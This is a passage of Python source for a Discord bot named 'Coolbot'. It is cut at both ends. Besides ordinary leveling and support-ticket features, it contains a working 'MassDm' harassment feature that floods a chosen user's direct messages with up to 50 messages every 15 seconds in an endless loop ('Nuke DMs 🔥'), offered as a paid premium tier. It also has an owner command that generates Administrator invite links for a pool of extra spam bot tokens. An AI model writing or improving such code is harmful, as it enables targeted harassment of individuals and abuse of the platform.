                        title="📬 Free MassDm — Sending…",
                        description=(
                            f"Sending to **{user.display_name}**…\n"
                            f"**1 bot** · **{amount} messages** · fires once 💣\n\n"
                            f"⚠️ Upgrade to Premium for infinite loop every 15s!"
                        ),
                        color=COLORS["warn"],
                    ),
                    view=None,
                )
                asyncio.create_task(_run_massdm_free_wave(user.id, amount=amount))

            @discord.ui.button(label="Cancel", style=discord.ButtonStyle.secondary)
            async def cancel(self_v, btn: discord.Interaction, button: discord.ui.Button):
                if btn.user.id != _author_id:
                    return await btn.response.send_message("❌ Not your menu.", ephemeral=False)
                self_v.stop()
                await btn.response.edit_message(
                    embed=discord.Embed(description="❌ Cancelled.", color=COLORS["error"]),
                    view=None,
                )

        return await ctx.send(
            embed=discord.Embed(
                title="📬 Free MassDm",
                description=(
                    f"Target: **{user.display_name}** ({user.mention})"
                    + chr(10) + chr(10)
                    + f"🆓 **Free tier:** **{amount}** messages · one-time (single bot)"
                    + chr(10) + chr(10)
                    + "💎 **Premium:** custom message · loops every **15s**"
                    + chr(10)
                    + "Contact the bot owner to upgrade."
                ),
                color=COLORS["info"],
            ).set_footer(text="Expires in 30s"),
            view=FreeDmConfirm(),
            ephemeral=False,
        )

    #  PREMIUM TIER — amount selector + custom message + loop
    msg_preview = (
        f"\n📝 **Custom message:** {custom_msg[:80]}{'…' if custom_msg and len(custom_msg) > 80 else ''}"
        if custom_msg else "\n📝 **Custom message:** (using default / none set)"
    )

    class AmountSelect(discord.ui.Select):
        def __init__(self, default_amt: int):
            options = []
            for n in (1, 2, 3, 5, 10, 15, 20, 25, 30, 40, 50):
                options.append(discord.SelectOption(
                    label=f"{n} messages",
                    value=str(n),
                    description=f"Send {n} message(s) per wave",
                    default=(n == default_amt),
                    emoji="📬",
                ))
            super().__init__(placeholder="How many messages per wave? (1–50)", min_values=1, max_values=1, options=options)
            self.chosen = default_amt

        async def callback(self, interaction: discord.Interaction):
            if interaction.user.id != _author_id:
                return await interaction.response.send_message("❌ Not your menu.", ephemeral=True)
            self.chosen = int(self.values[0])
            await interaction.response.defer()

    class MassDmConfirmPrefix(discord.ui.View):
        def __init__(self, default_amt: int):
            super().__init__(timeout=60)
            self.amount_select = AmountSelect(default_amt)
            self.add_item(self.amount_select)

        @discord.ui.button(label="Nuke DMs 🔥", style=discord.ButtonStyle.danger, row=1)
        async def confirm(self_v, btn: discord.Interaction, button: discord.ui.Button):
            if btn.user.id != _author_id:
                return await btn.response.send_message("❌ Not your menu.", ephemeral=False)
            self_v.stop()
            chosen_amt = max(1, min(int(getattr(self_v.amount_select, "chosen", amount) or 3), 50))
            old_ev = _MASSDM_STOP_EVENTS.get(user.id)
            if old_ev:
                old_ev.set()
            old = _MASSDM_TASKS.get(user.id)
            if old and not old.done():
                old.cancel()
            _MASSDM_AMOUNTS[user.id] = chosen_amt
            await btn.response.edit_message(
                embed=discord.Embed(
                    title="📬 Mass DMing — LOOP ACTIVE 🔄",
                    description=(
                        f"💀 Spamming **{user.display_name}** every **15 seconds** 🔥\n"
                        f"**1 bot** · **{chosen_amt} messages** per wave · infinite loop 💣"
                        f"{msg_preview}\n"
                        f"Use `,stopdm @{user.display_name}` to stop."
                    ),
                    color=COLORS["warn"],
                ).set_footer(text="Coolbot 🐻‍❄️ Premium MassDm — looping every 15s"),
                view=None,
            )
            _status_ch_id = ctx.channel.id if ctx.channel else 0
            if custom_msg:
                global _MASSDM_TEXT, _MASSDM_DEFAULT_MSG
                _MASSDM_DEFAULT_MSG = custom_msg
                _MASSDM_TEXT = custom_msg
            _MASSDM_TASKS[user.id] = asyncio.create_task(
                _massdm_loop_task(user.id, user.display_name, btn.user.display_name, _status_ch_id)
            )

        @discord.ui.button(label="Cancel", style=discord.ButtonStyle.secondary, row=1)
        async def cancel(self_v, btn: discord.Interaction, button: discord.ui.Button):
            if btn.user.id != _author_id:
                return await btn.response.send_message("❌ Not your menu.", ephemeral=False)
            self_v.stop()
            await btn.response.edit_message(
                embed=discord.Embed(description="❌ MassDm cancelled.", color=COLORS["error"]),
                view=None,
            )

    await ctx.send(
        embed=discord.Embed(
            title="⚠️ Confirm Premium MassDm — Choose Amount",
            description=(
                f"Target: **{user.display_name}** ({user.mention})\n\n"
                f"Select **how many messages** per wave (dropdown), then press **Nuke DMs 🔥**.\n"
                f"Loops every **15s** until you `,stopdm`.\n"
                f"{msg_preview}"
            ),
            color=COLORS["warn"],
        ).set_footer(text="Premium · Choose amount then confirm · Expires in 60s"),
        view=MassDmConfirmPrefix(amount),
        ephemeral=False,
    )


#  ,addbot — invite link for this bot (Administrator)
BOT_INVITE_URL = (
    "https://discord.com/oauth2/authorize"
    "?client_id=1563415330569719909"
    "&permissions=8"
    "&integration_type=0"
    "&scope=bot"
)

@bot.command(name="addbot", aliases=["invitebot", "botinvite", "inviteme"])
async def addbot_cmd(ctx, guild_id: str = None):
    """Post the OAuth2 link to add this bot to a server (Administrator)."""
    url = BOT_INVITE_URL
    if guild_id:
        try:
            gid = int(str(guild_id).strip())
            url = f"{BOT_INVITE_URL}&guild_id={gid}"
        except ValueError:
            return await ctx.send(embed=discord.Embed(
                description="❌ Invalid server ID. Usage: `,addbot` or `,addbot <server_id>`",
                color=COLORS["error"],
            ))
    e = discord.Embed(
        title=f"➕ Invite {BOT_NAME}",
        description=(
            f"Click the link below to add **{BOT_NAME}** to a server.\n\n"
            f"**[👉 Add Bot to Server]({url})**\n\n"
            f"Permissions: **Administrator** (`8`)\n"
            f"Client ID: `1563415330569719909`\n\n"
            f"Optional: `,addbot <server_id>` pre-selects that server."
        ),
        color=COLORS["main"],
    )
    e.set_footer(text=f"Requested by {ctx.author}")
    await ctx.send(embed=e)


#  ,botjoin  — DM the owner OAuth2 invite links for all extra bots
#  Discord blocks bots from joining via invite codes — OAuth2 links
#  are the only way. Each link is one click, no code entry needed.
#  Owner only.

def _decode_bot_user_id(token: str) -> Optional[str]:
    """Decode the Discord user ID embedded in a bot token (first segment)."""
    try:
        import base64 as _b64
        seg = token.split(".")[0]
        padding = (4 - len(seg) % 4) % 4
        return _b64.b64decode(seg + "=" * padding).decode()
    except Exception:
        return None

@bot.command(name="botjoin", aliases=["joinbots","allbotjoin"])
async def botjoin(ctx, guild_id: str = None):
    """Owner only — DM yourself OAuth2 add-to-server links for every extra bot.
    Optionally pass a guild_id to pre-fill the server selector."""
    if not has_owner_access(ctx.author):
        return

    perms = 8  # administrator
    scope = "bot%20applications.commands"

    lines = []
    failed = []
    for i, tok in enumerate(MASSDM_BOT_TOKENS, start=1):
        uid = _decode_bot_user_id(tok)
        if not uid:
            failed.append(f"Bot {i:02d}: ❌ couldn't decode ID")
            continue
        url = f"https://discord.com/oauth2/authorize?client_id={uid}&permissions={perms}&scope={scope}"
        if guild_id:
            url += f"&guild_id={guild_id}"
        lines.append(f"Bot {i:02d} (ID {uid}): {url}")

    total = len(MASSDM_BOT_TOKENS)
    ok    = total - len(failed)

    header = (
        f"🤖 BOT OAUTH2 INVITE LINKS ({ok}/{total} decoded)\n"
        f"{'=' * 55}\n"
        f"Click each link → select server → Authorise.\n"
        f"No code needed — one click per bot.\n"
        f"{'=' * 55}\n\n"
    )
    body = "\n".join(lines)
    if failed:
        body += "\n\nFAILED:\n" + "\n".join(failed)

    full_text = header + body

    # DM as a .txt attachment so links aren't truncated
    import io
    file_bytes = full_text.encode("utf-8")
    file_obj   = discord.File(io.BytesIO(file_bytes), filename="bot_invite_links.txt")

    try:
        dm = await ctx.author.create_dm()
        await dm.send(
            embed=discord.Embed(
                title="🤖 Bot Invite Links",
                description=(
                    f"**{ok}/{total}** links generated.\n"
                    f"Open the `.txt` file — click each link, pick the server, hit **Authorise**.\n"
                    f"No auth code, no extra steps."
                    + (f"\n\n**Pre-filled server:** `{guild_id}`" if guild_id else "")
                ),
                color=COLORS["success"] if ok == total else COLORS["warn"],
            ).set_footer(text="Coolbot 🐻‍❄️ — each link = one click to add that bot"),
            file=file_obj,
        )
        await ctx.reply(
            embed=discord.Embed(
                description=f"✅ DMed you **{ok}** invite links — check your DMs!",
                color=COLORS["success"],
            ),
            mention_author=False,
        )
    except discord.Forbidden:
        await ctx.reply(
            embed=discord.Embed(
                description="❌ Couldn't DM you — enable DMs from server members.",
                color=COLORS["error"],
            ),
            mention_author=False,
        )


#  LEVELING SYSTEM  (Arcane / GiveawayBot style)
#  • 15-25 XP per message, 60 s cooldown per user per guild
#  • Level formula: xp_needed(lvl) = 5*lvl^2 + 50*lvl + 100
#  • Milestone roles auto-assigned at Level 5, 10, 15, 20 …
#    Bot finds roles whose name matches "Level <N>" (case-ins)
#  • Level 10 required in server REQUIRED_GUILD_ID to use free ,massdm

_LEVEL_DATA: dict = {}          # {guild_id: {user_id: {"xp":int,"level":int,"last_xp":float}}}
_LEVEL_XP_COOLDOWN: dict = {}   # {(guild_id, user_id): last_xp_timestamp}

def _xp_for_level(lvl: int) -> int:
    """XP needed to complete level `lvl` (Arcane formula)."""
    if lvl < 0:
        lvl = 0
    return 5 * (lvl ** 2) + 50 * lvl + 100

def _safe_xp(value) -> int:
    """Coerce stored XP to a non-negative int (guards corrupt JSON / floats)."""
    try:
        v = int(value)
    except (TypeError, ValueError):
        return 0
    return max(0, v)

def _level_from_total_xp(total_xp) -> int:
    remaining = _safe_xp(total_xp)
    lvl = 0
    # Hard cap so a corrupt huge number can never hang the event loop
    for _ in range(10000):
        need = _xp_for_level(lvl)
        if remaining < need:
            break
        remaining -= need
        lvl += 1
    return lvl

def _xp_progress(total_xp):
    """Returns (current_level, xp_into_this_level, xp_needed_for_next_level)."""
    remaining = _safe_xp(total_xp)
    lvl = 0
    for _ in range(10000):
        need = _xp_for_level(lvl)
        if remaining < need:
            break
        remaining -= need
        lvl += 1
    return lvl, remaining, _xp_for_level(lvl)

def _level_role_name(lvl: int) -> str:
    return f"Level {lvl}"

def _milestone_level(lvl: int) -> Optional[int]:
    """Return the milestone level (multiple of 5) ≤ lvl, or None."""
    m = (lvl // 5) * 5
    return m if m > 0 else None

async def _assign_level_role(member: discord.Member, new_level: int):
    """Find and assign the highest milestone role the user has earned; remove lower milestone roles."""
    guild = member.guild
    milestone = _milestone_level(new_level)
    if milestone is None:
        return

    # Collect all milestone roles that exist in the guild
    milestone_roles = {}
    for role in guild.roles:
        if role.name.lower().startswith("level "):
            try:
                lvl_num = int(role.name.split()[-1])
                if lvl_num % 5 == 0:
                    milestone_roles[lvl_num] = role
            except (ValueError, IndexError):
                pass

    if not milestone_roles:
        return

    to_add   = milestone_roles.get(milestone)

    try:
        if to_add and to_add not in member.roles:
            await member.add_roles(to_add, reason=f"Coolbot — reached Level {milestone}")
    except Exception:
        pass

def _load_level_data():
    global _LEVEL_DATA
    raw = load("level_data")
    if isinstance(raw, dict):
        _LEVEL_DATA = {int(gid): {int(uid): v for uid, v in users.items()} for gid, users in raw.items()}

def _save_level_data():
    save("level_data", {str(gid): {str(uid): v for uid, v in users.items()} for gid, users in _LEVEL_DATA.items()})

def _get_user_xp(guild_id: int, user_id: int) -> dict:
    return _LEVEL_DATA.setdefault(guild_id, {}).setdefault(user_id, {"xp": 0, "level": 0, "last_xp": 0.0})

def _get_user_level_in_guild(guild_id: int, user_id: int) -> int:
    d = _LEVEL_DATA.get(guild_id, {}).get(user_id, {})
    return _level_from_total_xp(d.get("xp", 0))


class LevelingCog(commands.Cog):
    """Arcane-style leveling — XP on message, milestone roles, rank cards."""

    def __init__(self, bot):
        self.bot = bot
        _load_level_data()

    # ── XP gain on message ────────────────────────────────────────────────
    @commands.Cog.listener()
    async def on_message(self, message: discord.Message):
        try:
            if message.author.bot:
                return
            if not message.guild:
                return
            if not message.content or len(message.content.strip()) < 2:
                return

            guild_id = message.guild.id
            user_id  = message.author.id
            now      = time.time()
            key      = (guild_id, user_id)

            # 60 s XP cooldown (same as Arcane)
            if now - _LEVEL_XP_COOLDOWN.get(key, 0) < 60:
                return
            _LEVEL_XP_COOLDOWN[key] = now

            xp_gain = random.randint(15, 25)
            data = _get_user_xp(guild_id, user_id)
            data["xp"] = _safe_xp(data.get("xp", 0))
            old_level = _level_from_total_xp(data["xp"])
            data["xp"] = data["xp"] + xp_gain
            data["last_xp"] = now
            new_level = _level_from_total_xp(data["xp"])
            data["level"] = new_level
            try:
                _save_level_data()
            except Exception as ex:
                print(f"[Leveling] save failed: {ex}")

            if new_level > old_level:
                await self._on_level_up(message, new_level)
        except Exception as ex:
            print(f"[Leveling] on_message error: {ex}")

    async def _on_level_up(self, message: discord.Message, new_level: int):
        member  = message.author
        guild   = message.guild
        channel = message.channel
        ch_id = _LEVEL_CHANNELS.get(guild.id)
        if ch_id:
            configured = guild.get_channel(ch_id)
            if configured and configured.permissions_for(guild.me).send_messages:
                channel = configured

        # Role assignment
        await _assign_level_role(member, new_level)

        milestone = _milestone_level(new_level)
        role_txt  = ""
        if milestone == new_level:
            role_txt = f"\n🎭 **Role assigned:** {_level_role_name(milestone)}"

        try:
            await channel.send(
                embed=discord.Embed(
                    title="⭐  Level Up!",
                    description=(
                        f"{member.mention} just reached **Level {new_level}**! 🎉{role_txt}\n\n"
                        f"Keep chatting to climb the leaderboard 📈"
                    ),
                    color=0xF1C40F,
                ).set_thumbnail(url=member.display_avatar.url)
                 .set_footer(text=f"Coolbot  ·  Leveling  ·  {guild.name}"),
            )
        except Exception:
            pass

    # ── ,rank / ,level ───────────────────────────────────────────────────
    @commands.command(name="rank", aliases=["level"])
    async def rank_cmd(self, ctx, member: discord.Member = None):
        """Show your XP rank card."""
        target = member or ctx.author
        data   = _get_user_xp(ctx.guild.id, target.id)
        total_xp = data["xp"]
        lvl, xp_in, xp_need = _xp_progress(total_xp)

        # Leaderboard position
        guild_data = _LEVEL_DATA.get(ctx.guild.id, {})
        sorted_members = sorted(guild_data.items(), key=lambda kv: kv[1].get("xp", 0), reverse=True)
        rank_pos = next((i + 1 for i, (uid, _) in enumerate(sorted_members) if uid == target.id), "?")

        bar_filled = int((xp_in / max(xp_need, 1)) * 20)
        bar = "█" * bar_filled + "░" * (20 - bar_filled)

        e = discord.Embed(
            title=f"⭐  {target.display_name}'s Rank",
            color=0xF1C40F,
        )
        e.set_thumbnail(url=target.display_avatar.url)
        e.add_field(name="🏆  Rank",   value=f"**#{rank_pos}** in {ctx.guild.name}", inline=True)
        e.add_field(name="📶  Level",  value=f"**{lvl}**",                           inline=True)
        e.add_field(name="✨  Total XP",value=f"**{total_xp:,}**",                   inline=True)
        e.add_field(
            name=f"📊  Progress to Level {lvl + 1}",
            value=f"`{bar}` **{xp_in:,} / {xp_need:,} XP**",
            inline=False,
        )
        milestone = _milestone_level(lvl)
        if milestone:
            e.add_field(name="🎭  Current Milestone Role", value=_level_role_name(milestone), inline=True)
        next_m = milestone + 5 if milestone else 5
        xp_to_next_m = sum(_xp_for_level(l) for l in range(lvl, next_m)) - xp_in
        e.add_field(name=f"🎯  Next Role ({_level_role_name(next_m)})", value=f"**{max(xp_to_next_m,0):,} XP away**", inline=True)
        e.set_footer(text=f"Coolbot  ·  Arcane-style leveling  ·  15-25 XP/msg (60s cooldown)")
        await ctx.send(embed=e)

    # ── XP leaderboard (kept available under its own command) ────────────
    @commands.command(name="levellb", aliases=["levels", "xplb"])
    async def lb_cmd(self, ctx):
        """Show the XP leaderboard for this server."""
        guild_data = _LEVEL_DATA.get(ctx.guild.id, {})
        if not guild_data:
            return await ctx.send(embed=discord.Embed(
                description="📭 No XP data yet — start chatting to earn XP!",
                color=COLORS["info"]))

        sorted_members = sorted(guild_data.items(), key=lambda kv: kv[1].get("xp", 0), reverse=True)[:15]
        lines = []
        medals = {1: "🥇", 2: "🥈", 3: "🥉"}
        for i, (uid, d) in enumerate(sorted_members, 1):
            total = d.get("xp", 0)
            lvl   = _level_from_total_xp(total)
            mem   = ctx.guild.get_member(uid)
            name  = mem.display_name if mem else f"User {uid}"
            icon  = medals.get(i, f"**{i}.**")
            lines.append(f"{icon} `{name}` — **Lv {lvl}** · {total:,} XP")

        e = discord.Embed(
            title=f"🏆  {ctx.guild.name} — XP Leaderboard",
            description="\n".join(lines),
            color=0xF1C40F,
        ).set_footer(text="Coolbot  ·  Top 15  ·  Arcane-style leveling")
        await ctx.send(embed=e)

    # ── ,givexp ──────────────────────────────────────────────────────────
    @commands.command(name="givexp", aliases=["addxp", "addexp", "addexperience"])
    async def givexp_cmd(self, ctx, member: discord.Member, amount: int):
        if amount <= 0:
            return await ctx.send("❌ XP amount must be a positive number.")
        if not has_owner_access(ctx.author):
            return await ctx.send(embed=discord.Embed(description="❌ Owner only.", color=COLORS["error"]), delete_after=5)
        data = _get_user_xp(ctx.guild.id, member.id)
        data["xp"] = max(0, data["xp"] + amount)
        _save_level_data()
        await ctx.send(embed=discord.Embed(
            description=f"✅ Gave **{amount:,} XP** to {member.mention}. Total: **{data['xp']:,} XP**",
            color=COLORS["success"]))

    # ── ,removexp ────────────────────────────────────────────────────────
    @commands.command(name="removexp")
    async def removexp_cmd(self, ctx, member: discord.Member, amount: int):
        if amount <= 0:
            return await ctx.send("❌ XP amount must be a positive number.")
        if not has_owner_access(ctx.author):
            return await ctx.send(embed=discord.Embed(description="❌ Owner only.", color=COLORS["error"]), delete_after=5)
        data = _get_user_xp(ctx.guild.id, member.id)
        data["xp"] = max(0, data["xp"] - amount)
        _save_level_data()
        await ctx.send(embed=discord.Embed(
            description=f"✅ Removed **{amount:,} XP** from {member.mention}. Total: **{data['xp']:,} XP**",
            color=COLORS["success"]))

    # ── ,resetxp ─────────────────────────────────────────────────────────
    @commands.command(name="resetxp")
    async def resetxp_cmd(self, ctx, member: discord.Member):
        if not has_owner_access(ctx.author):
            return await ctx.send(embed=discord.Embed(description="❌ Owner only.", color=COLORS["error"]), delete_after=5)
        _LEVEL_DATA.setdefault(ctx.guild.id, {})[member.id] = {"xp": 0, "level": 0, "last_xp": 0.0}
        _save_level_data()
        await ctx.send(embed=discord.Embed(
            description=f"✅ Reset **{member.display_name}**'s XP to 0.",
            color=COLORS["success"]))

    # ── ,xpinfo ──────────────────────────────────────────────────────────
    @commands.command(name="xpinfo")
    async def xpinfo_cmd(self, ctx):
        """How the leveling system works."""
        e = discord.Embed(
            title="⭐  Coolbot Leveling — How It Works",
            color=0xF1C40F,
        )
        e.add_field(
            name="📩  Earning XP",
            value="Send a message → earn **15–25 XP** (60 second cooldown between gains, same as Arcane).",
            inline=False,
        )
        e.add_field(
            name="📊  Level Formula",
            value=(
                "XP needed for each level = `5 × lvl² + 50 × lvl + 100`\n"
                "Lv 0→1: **100 XP** · Lv 4→5: **200 XP** · Lv 9→10: **650 XP** · Lv 19→20: **2,000 XP**"
            ),
            inline=False,
        )
        e.add_field(
            name="🎭  Level Roles (auto-assigned)",
            value=(
                "At every **5th level** (5, 10, 15, 20 …) the bot finds a role named "
                "**Level 5**, **Level 10** etc. in your server and automatically gives it to you.\n"
                "Old milestone roles are removed when you earn a higher one."
            ),
            inline=False,
        )
        e.add_field(
            name="🔓  Level 10 Gate",
            value=f"You must be **Level 10** in <#{REQUIRED_GUILD_ID}> to use the free `,massdm`.",
            inline=False,
        )
        e.set_footer(text="Coolbot  ·  Arcane/GiveawayBot-style leveling  ·  ,rank · ,lb · ,givexp")
        await ctx.send(embed=e)

    @commands.hybrid_command(name="setlevelchannel", aliases=["levelchannel", "setlevel"], description="Set Mikasa level-up announcement channel (Admin/Owner)")
    @app_commands.describe(channel="Channel for level-up announcements (omit to clear)")
    async def setlevelchannel_cmd(self, ctx, channel: discord.TextChannel = None):
        if not ctx.guild:
            return await ctx.send(embed=discord.Embed(description="❌ Server only.", color=COLORS["error"]))
        if not (has_owner_access(ctx.author) or getattr(ctx.author.guild_permissions, "administrator", False) or is_staff(ctx.author)):
            return await ctx.send(embed=discord.Embed(description="❌ Admin only.", color=COLORS["error"]))
        if channel is None:
            _LEVEL_CHANNELS.pop(ctx.guild.id, None)
            try:
                save("level_channels", {str(k): v for k, v in _LEVEL_CHANNELS.items()})
            except Exception:
                pass
            return await ctx.send(embed=discord.Embed(
                description="✅ Level-up channel **cleared** — messages post where the user leveled up.",
                color=COLORS["success"],
            ))
        _LEVEL_CHANNELS[ctx.guild.id] = channel.id
        try:
            save("level_channels", {str(k): v for k, v in _LEVEL_CHANNELS.items()})
        except Exception:
            pass
        await ctx.send(embed=discord.Embed(
            title="⭐ Level-Up Channel Set",
            description=f"Level-up messages will be sent in {channel.mention}.\nUse `,setlevelchannel` with no channel to clear.",
            color=COLORS["success"],
        ))


#  TICKET SYSTEM v2 — Dropdown + Modal forms (customisable)

_TICKET_SETTINGS: dict = {}  # guild_id -> settings dict
_OPEN_TICKETS:    dict = {}  # guild_id -> {user_id: channel_id}

DEFAULT_TICKET_TYPES = [
    {"value": "general",   "emoji": "💬", "label": "General Support",   "desc": "General questions & help"},
    {"value": "claiming",  "emoji": "🎁", "label": "Claiming / Reward",  "desc": "Claim a prize, reward or giveaway win"},
    {"value": "bugreport", "emoji": "🐛", "label": "Bug Report",         "desc": "Report a bug or broken feature"},
    {"value": "appeal",    "emoji": "⚖️",  "label": "Appeal",             "desc": "Appeal a ban, mute or warning"},
    {"value": "partner",   "emoji": "🤝", "label": "Partnership",        "desc": "Partnership or collab request"},
    {"value": "other",     "emoji": "❓", "label": "Other",              "desc": "Anything else"},
]

def _get_ticket_settings(guild_id: int) -> dict:
    if guild_id not in _TICKET_SETTINGS:
        raw = load("ticket_settings")
        if isinstance(raw, dict) and str(guild_id) in raw and isinstance(raw[str(guild_id)], dict):
            _TICKET_SETTINGS[guild_id] = raw[str(guild_id)]
        else:
            _TICKET_SETTINGS[guild_id] = {
                "category_id":     None,
                "log_channel_id":  None,
                "support_role_id": None,
                "ticket_counter":  0,
                "ticket_types":    list(DEFAULT_TICKET_TYPES),
                "panel_title":     "Support Tickets",
                "panel_desc":      None,
            }
    return _TICKET_SETTINGS[guild_id]


def _save_ticket_settings():
    try:
        save("ticket_settings", {str(k): v for k, v in _TICKET_SETTINGS.items()})
    except Exception as ex:
        print(f"[tickets] save failed: {ex}")


def _is_ticket_staff(member: discord.Member) -> bool:
    if member.id == OWNER_ID:
        return True
    if member.guild_permissions.manage_channels or member.guild_permissions.administrator:
        return True
    settings = _get_ticket_settings(member.guild.id)
    if settings.get("support_role_id"):
        if any(r.id == settings["support_role_id"] for r in member.roles):
            return True
    return any(r.name.lower() in STAFF_ROLE_NAMES for r in member.roles)

async def _create_ticket_channel(
    guild: discord.Guild,
    user: discord.Member,
    ticket_type: dict = None,
    subject: str = None,
    description: str = None,
):
    settings = _get_ticket_settings(guild.id)
    settings["ticket_counter"] = settings.get("ticket_counter", 0) + 1
    num   = settings["ticket_counter"]
    _save_ticket_settings()
    ttype = ticket_type or {"label": "Support", "emoji": "🎫", "value": "general"}

    category = None
    if settings.get("category_id"):
        category = guild.get_channel(settings["category_id"])
    if category is None:
        for cat in guild.categories:
            if "ticket" in cat.name.lower():
                category = cat; break
    if category is None:
        try:
            category = await guild.create_category("🎫 Tickets")
            settings["category_id"] = category.id
        except Exception:
            pass

    overwrites = {
        guild.default_role: discord.PermissionOverwrite(view_channel=False),
        user: discord.PermissionOverwrite(
            view_channel=True, send_messages=True,
            read_message_history=True, attach_files=True, embed_links=True,
        ),
        guild.me: discord.PermissionOverwrite(
            view_channel=True, send_messages=True, manage_channels=True,
            manage_messages=True, read_message_history=True,
        ),
    }
    if settings.get("support_role_id"):
        sr = guild.get_role(settings["support_role_id"])
        if sr:
            overwrites[sr] = discord.PermissionOverwrite(
                view_channel=True, send_messages=True,
                read_message_history=True, manage_messages=True,
            )
    for role in guild.roles:
        if role.name in STAFF_ROLE_NAMES:
            overwrites[role] = discord.PermissionOverwrite(
                view_channel=True, send_messages=True,
                read_message_history=True, manage_messages=True,
            )

    safe_name = user.name[:10].lower().replace(" ", "-")
    ch = await guild.create_text_channel(
        name=f"ticket-{num:04d}-{safe_name}",
        category=category,
        overwrites=overwrites,
        topic=f"Ticket #{num:04d} | {ttype['label']} | {user} ({user.id})" + (f" | {subject}" if subject else ""),
        reason=f"Coolbot ticket #{num:04d} by {user}",
    )
    _OPEN_TICKETS.setdefault(guild.id, {})[user.id] = ch.id

    subj_line  = f"\n📌 **Subject:** {subject}" if subject else ""
    desc_line  = f"\n\n📝 **Details:**\n{description}" if description else ""
    e = discord.Embed(
        title=f"{ttype['emoji']}  {ttype['label']} — Ticket #{num:04d}",
        description=(
            f"Welcome {user.mention}! Staff will be with you shortly.{subj_line}{desc_line}\n\n"
            "🔒 Click **Close Ticket** when your issue is resolved."
        ),
        color=0x5865F2,
    )
    e.set_footer(text=f"Coolbot Tickets  •  #{num:04d}  •  {user}")
    e.timestamp = discord.utils.utcnow()
    await ch.send(content=user.mention, embed=e, view=TicketCloseView())

    _all_log_id = gdata(load("server_settings"), guild.id).get("mikasa_all_logs_channel")
    _ticket_log_id = _all_log_id or settings.get("log_channel_id")
    if _ticket_log_id:
        log_ch = guild.get_channel(int(_ticket_log_id))
        if log_ch:
            try:
                await log_ch.send(embed=discord.Embed(
                    title=f"{ttype['emoji']}  Ticket Opened — #{num:04d}",
                    description=(
                        f"**User:** {user.mention} (`{user.id}`)\n"
                        f"**Type:** {ttype['label']}\n"
                        f"**Subject:** {subject or '—'}\n"
                        f"**Channel:** {ch.mention}\n"
                        f"**Time:** <t:{int(time.time())}:F>"
                    ),
                    color=COLORS["success"],
                ))
            except Exception:
                pass
    return ch, num


# ── Modal form (shown after user picks a ticket type) ────────────────
class TicketFormModal(discord.ui.Modal):
    def __init__(self, ticket_type: dict):
        super().__init__(title=f"{ticket_type['emoji']}  {ticket_type['label'][:40]}")
        self.ticket_type = ticket_type
        self.subject = discord.ui.TextInput(
            label="Subject",
            placeholder="One-line summary of your issue",
            max_length=100,
            required=True,
        )
        self.body = discord.ui.TextInput(
            label="Describe your issue",
            style=discord.TextStyle.paragraph,
            placeholder="Include as much detail as possible — screenshots, usernames, etc.",
            max_length=1000,
            required=True,
        )
        self.add_item(self.subject)
        self.add_item(self.body)

    async def on_submit(self, interaction: discord.Interaction):
        guild = interaction.guild
        user  = interaction.user

        if guild.id in _OPEN_TICKETS and user.id in _OPEN_TICKETS[guild.id]:
            existing = guild.get_channel(_OPEN_TICKETS[guild.id][user.id])
            if existing:
                return await interaction.response.send_message(
                    embed=discord.Embed(
                        description=f"❌ You already have an open ticket: {existing.mention}",
                        color=COLORS["error"],
                    ),
                    ephemeral=False,
                )

        await interaction.response.defer(ephemeral=False)
        try:
            ch, num = await _create_ticket_channel(
                guild, user,
                ticket_type=self.ticket_type,
                subject=self.subject.value,
                description=self.body.value,
            )
            await interaction.followup.send(
                embed=discord.Embed(
                    description=f"✅ Ticket created: {ch.mention}", color=COLORS["success"]
                ),
                ephemeral=False,
            )
            # Auto-delete the confirmation after 5 seconds
            try:
                msg = await interaction.original_response()
                await msg.delete(delay=5)
            except Exception:
                pass
        except Exception as ex:
            await interaction.followup.send(
                embed=discord.Embed(description=f"❌ Could not create ticket: `{ex}`", color=COLORS["error"]),
                ephemeral=False,
            )


# ── Dropdown select on the panel ─────────────────────────────────────
class TicketTypeSelect(discord.ui.Select):
    def __init__(self, guild_id: int = None):
        settings = _get_ticket_settings(guild_id) if guild_id else {}
        types    = settings.get("ticket_types", DEFAULT_TICKET_TYPES)
        options  = [
            discord.SelectOption(
                label=t["label"],
                value=t["value"],
                emoji=t["emoji"],
                description=t["desc"][:100],
            )
            for t in types[:25]
        ] or [discord.SelectOption(label="General Support", value="general", emoji="💬")]
        super().__init__(
            placeholder="📋  What kind of ticket do you need?",
            options=options,
            custom_id="Coolbot_ticket_type_select",
            row=0,
        )

    async def callback(self, interaction: discord.Interaction):
        guild    = interaction.guild
        settings = _get_ticket_settings(guild.id)
        types    = settings.get("ticket_types", DEFAULT_TICKET_TYPES)
        chosen   = next((t for t in types if t["value"] == self.values[0]), DEFAULT_TICKET_TYPES[0])
        await interaction.response.send_modal(TicketFormModal(chosen))


class TicketPanelView(discord.ui.View):
    """Persistent panel view — the Select custom_id persists across restarts."""
    def __init__(self, guild_id: int = None):
        super().__init__(timeout=None)
        self.add_item(TicketTypeSelect(guild_id))


# ── Close button view ────────────────────────────────────────────────
class TicketCloseView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="🔒 Close Ticket", style=discord.ButtonStyle.danger, custom_id="Coolbot_ticket_close")
    async def close_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        ch    = interaction.channel
        guild = interaction.guild
        ticket_owner_id = None
        for uid, cid in _OPEN_TICKETS.get(guild.id, {}).items():
            if cid == ch.id:
                ticket_owner_id = uid; break

        if not _is_ticket_staff(interaction.user) and interaction.user.id != ticket_owner_id:
            return await interaction.response.send_message(
                embed=discord.Embed(description="❌ Only staff or the ticket creator can close this.", color=COLORS["error"]),
                ephemeral=False,
            )
        confirm = TicketConfirmCloseView(ticket_owner_id, interaction.user)
        await interaction.response.send_message(
            embed=discord.Embed(
                title="🔒  Close Ticket?",
                description="This will **permanently delete** the ticket channel. Are you sure?",
                color=COLORS["warn"],
            ),
            view=confirm,
            ephemeral=False,
        )


class TicketConfirmCloseView(discord.ui.View):
    def __init__(self, owner_id, closer):
        super().__init__(timeout=30)
        self.owner_id = owner_id
        self.closer   = closer

    @discord.ui.button(label="✅ Yes, close it", style=discord.ButtonStyle.danger)
    async def confirm(self, interaction: discord.Interaction, button: discord.ui.Button):
        guild    = interaction.guild
        ch       = interaction.channel
        settings = _get_ticket_settings(guild.id)
        _all_log_id = gdata(load("server_settings"), guild.id).get("mikasa_all_logs_channel")
        _ticket_log_id = _all_log_id or settings.get("log_channel_id")
        if _ticket_log_id:
            log_ch = guild.get_channel(int(_ticket_log_id))
            if log_ch:
